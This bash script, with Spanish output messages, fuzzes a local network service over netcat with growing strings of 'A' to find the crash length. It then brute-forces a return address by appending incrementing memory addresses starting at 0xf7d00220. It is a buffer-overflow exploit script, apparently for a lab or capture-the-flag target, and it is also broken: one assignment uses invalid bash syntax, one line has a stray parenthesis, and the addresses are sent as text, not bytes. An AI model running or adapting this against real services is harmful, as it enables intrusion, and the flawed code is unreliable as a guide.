#!/bin/bash

N=1
HOST="localhost"
PORT=9999

while true; do
  PAYLOAD=$(printf 'A%.0s' $(seq 1 $N))
  echo $PAYLOAD
  RESPONSE=$(echo "$PAYLOAD" | nc "$HOST" "$PORT")

  if [[ -n "$RESPONSE" ]]; then
    echo "[$(date)] TRY $N: ✅ Respuesta recibida"
  else
    echo "[$(date)] TRY $N: ❌ Sin respuesta"
    echo "Fallo detectado en TRY $N"
    break
  fi
  ((N += 1))
done

echo "Número que falló: $N"

((N -= 1))
BASE=0xf7d00220
PAYLOAD=$(printf 'A%.0s' $(seq 1 $N))
while true; do
  HEX=$(printf "0x%08X" $BASE)
  echo "Dirección de memoria generada: $HEX"
  BASE=$((BASE + 0x1000))

  FINAL_P = $PAYLOAD + $HEX

  echo $FINAL_P
  echo "$FINAL_P" | nc "$HOST" "$PORT")
  echo "Payload final $HEX"
done 



